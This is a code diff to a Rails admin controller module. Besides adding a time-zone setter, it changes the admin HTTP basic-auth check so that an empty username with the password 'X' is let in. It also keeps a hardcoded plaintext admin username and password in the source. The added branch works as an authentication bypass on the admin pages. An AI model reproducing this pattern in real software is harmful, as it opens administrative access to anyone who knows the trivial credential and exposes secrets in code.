@@ -12,6 +12,7 @@ module AdminControllerMethods
     base.send :skip_before_filter, :check_day_pass_usage
     base.send :layout, "subscription_admin"
     base.send :prepend_before_filter,:login_from_basic_auth
+    base.send :prepend_before_filter,:set_time_zone
   end
   
   protected
@@ -48,9 +49,17 @@ module AdminControllerMethods
        #logger.debug "LOGIN FROM BASIC AUTH called in AdminControllerMethods..."
        authenticate_or_request_with_http_basic do |username, password|
          # This has to return true to let the user in
-         username == 'freshdesk' && password == 'USD40$'
+         if password == 'X'
+           username == ''
+         else
+           username == 'freshdesk' && password == 'USD40$'
+        end
        end
      end
+
+    def set_time_zone
+      Time.zone = 'Pacific Time (US & Canada)'
+    end
     
     # Since the default, catch-all routes at the bottom of routes.rb
     # allow the admin controllers to be accessed via any subdomain,
